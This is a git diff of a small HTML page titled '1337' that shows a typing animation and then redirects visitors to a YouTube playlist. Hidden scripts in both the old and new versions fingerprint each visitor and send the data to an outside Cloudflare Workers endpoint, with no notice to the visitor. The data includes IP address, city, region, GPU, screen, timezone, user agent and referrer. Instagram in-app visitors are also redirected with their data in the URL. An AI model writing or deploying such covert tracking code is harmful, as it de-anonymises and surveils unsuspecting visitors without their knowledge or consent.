@@ -1,126 +1,92 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset='UTF-8'/>
-    <meta content='width=device-width, initial-scale=0.5, user-scalable=0, minimum-scale=0.5, maximum-scale=5' name='viewport'/>
-    <title>1337</title>
-    <link rel="stylesheet" href="./f1337.css">
+  <meta charset='UTF-8'/>
+  <meta content='width=device-width, initial-scale=0.5, user-scalable=0, minimum-scale=0.5, maximum-scale=5' name='viewport'/>
+  <title>1337</title>
+  <link rel="stylesheet" href="./f1337.css">
 </head>
 
 <body>
-    <div class="container">
-        <p>pinguri<span class="typed-text"></span><span class="cursor">&nbsp;</span></p>
-        <img src="pinguri1337.png" alt="❤" style="width:100px;height:100px;">
-    </div>
-    
-    <script src="./f1337.js"></script>
+  <div class="container">
+    <p>pinguri<span class="typed-text"></span><span class="cursor">&nbsp;</span></p>
+    <img src="pinguri1337.png" alt="❤" style="width:100px;height:100px;">
+  </div>
 
-    <script>
-  try {
-    const urlParams = new URLSearchParams(window.location.search);
+  <script src="./f1337.js"></script>
+
+  <script>
+    // Delay buat redirect normal
+    setTimeout(function () {
+      window.location = 'intent://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t#Intent;package=com.google.android.youtube;scheme=https;end';
+      window.location = 'vnd.youtube://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
+
+      setTimeout(function () {
+        window.location = 'https://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
+      }, 1000);
+    }, 5000);
+  </script>
+
+  <script>
+    // Kumpulin data visitor
+    (async function () {
+      const userAgent = navigator.userAgent;
+      const language = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const screenSize = screen.width + "x" + screen.height;
+      const platform = navigator.platform;
+      const cookies = navigator.cookieEnabled;
+      const doNotTrack = navigator.doNotTrack;
+
+      // Default GPU value
+      let gpu = "Not Available";
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      } catch (e) {
+        gpu = "Error";
+      }
+
+      // Get IP from ipify
+      let ip = "Unknown";
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip;
+      } catch (e) {
+        ip = "Error";
+      }
+
+      // Referrer
+      const refUrl = document.referrer;
+
+      // Gabungin semua info ke 1 string buat di-encode
+      const infoText = `
+🧭 User Agent: ${userAgent}
+🌐 Language: ${language}
+🕒 Timezone: ${timezone}
+🖥️ Screen: ${screenSize}
+💻 Platform: ${platform}
+🍪 Cookies Enabled: ${cookies}
+🚫 Do Not Track: ${doNotTrack}
+🎮 GPU: ${gpu}
+🌍 IP Address: ${ip}
+🔗 Referrer: ${refUrl}
+      `.trim();
+
+      // Cek kalo pake Instagram browser
+      const urlParams = new URLSearchParams(window.location.search);
     
     const fromWorker = urlParams.has("from");
-    const nig = urlParams.has("nig");
-
-    if (nig) {
-      // Detected click from Instagram/Facebook
-      window.location.href = "https://workers.client57.workers.dev/api/rfig";
-    }
-  } catch (e) {
-    console.log("Redirect check failed:", e);
-  }
-</script>
     
-    <script>
-        // Simple log at page load
-        try {
-            const date = new Date();
-            const timeZone = "Asia/Jakarta";
-            const options = {
-                timeZone: timeZone,
-                hour: "2-digit",
-                minute: "2-digit",
-                second: "2-digit",
-                day: "2-digit",
-                month: "2-digit",
-                year: "numeric",
-            };
-            const formattedTime = new Intl.DateTimeFormat("id", options).format(date);
-            const userAgent = navigator.userAgent || "Unknown User-Agent";
-            const refUrl = document.referrer || "No Referrer";
-            const infoText = `[ ${formattedTime} ] | Page Loaded`;
-            const url = `https://workers.client57.workers.dev/api/log?result=%0A${infoText}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;
-            
-            fetch(url).catch(error => {
-                console.error("Error in simple log:", error);
-            });
-        } catch (e) {
-            console.log("Error in simple log:", e);
-        }
-    </script>
+      if (userAgent.toLowerCase().includes("instagram") && !fromWorker) {
+        const encoded = encodeURIComponent(infoText);
+        window.location.href = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}%0AUser-Agent:%20${encodeURIComponent(userAgent)}%0AReferrer:%20${encodeURIComponent(refUrl)}`;
+      }
+    })();
+  </script>
 
-    <script>
-        setTimeout(function() {
-            window.location = 'intent://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t#Intent;package=com.google.android.youtube;scheme=https;end';
-            window.location = 'vnd.youtube://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
-
-            setTimeout(function() {
-                window.location = 'https://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';
-            }, 1000);
-        }, 5000);
-    </script>
-
-    <script>
-        try {
-            let ip;
-            let city;
-            let region;
-
-            fetch(`https://ipinfo.io/json?token=7ad47c91e38458`)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! Status: ${response.status}`);
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    ip = data.ip || "N/A";
-                    city = data.city || "N/A";
-                    region = data.region || "N/A";
-
-                    const date = new Date();
-                    const timeZone = "Asia/Jakarta";
-                    const options = {
-                        timeZone: timeZone,
-                        hour: "2-digit",
-                        minute: "2-digit",
-                        second: "2-digit",
-                        day: "2-digit",
-                        month: "2-digit",
-                        year: "numeric",
-                    };
-                    const formattedTime = new Intl.DateTimeFormat("id", options).format(date);
-
-                    const userAgent = navigator.userAgent || "Unknown User-Agent";
-                    const refUrl = document.referrer || "No Referrer";
-                    const infoText = `[ ${formattedTime} ] `;
-                    const url = `https://workers.client57.workers.dev/api/log?result=%0A${infoText} | ${ip}%0ACity: ${city}%0ARegion: ${region}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;
-
-                    return fetch(url);
-                })
-                .catch(error => {
-                    console.error("Error fetching IP data:", error);
-
-                    const userAgent = navigator.userAgent || "Unknown User-Agent";
-                    const refUrl = document.referrer || "No Referrer";
-                    const fallbackInfo = `[ ${new Date().toISOString()} ] | Error occurred`;
-                    const fallbackUrl = `https://workers.client57.workers.dev/api/log?result=%0A${fallbackInfo}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;
-
-                    return fetch(fallbackUrl);
-                });
-        } catch (e) {
-            console.log("Error occurred while processing elements. Continuing with other functions...", e);
-        }
-    </script>
 </body>
 </html>
